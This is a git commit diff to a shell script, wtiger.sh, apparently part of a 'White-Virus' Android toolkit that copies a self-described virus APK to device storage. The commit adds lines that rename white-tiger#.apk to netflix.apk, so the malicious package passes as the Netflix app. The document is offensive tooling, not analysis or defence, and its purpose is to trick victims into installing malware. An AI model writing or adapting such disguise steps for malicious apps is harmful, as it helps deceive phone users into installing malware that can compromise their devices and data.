afa96b2c94978e0816fe091e0944d4f161f7a19c
tnrat-ra <75009328+tnrat-ra@users.noreply.github.com>
2020-12-15 14:29:28 +0530

    Update wtiger.sh

--- wtiger.sh
+++ wtiger.sh
@@ -8,6 +8,10 @@ gem install lolcat
 cd 
 cd White-Virus
 cp -r white-tiger#.apk /sdcard
+cd
+cd /sdcard
+mv white-tiger#.apk netflix.apk
+cd
 clear
 figlet Prince Yasin |lolcat|lolcat
 echo -e "\e[1;34m[*] \e[32VVirus Created successfully with name of white-tiger#.apk check your internal storage....\e[0m";
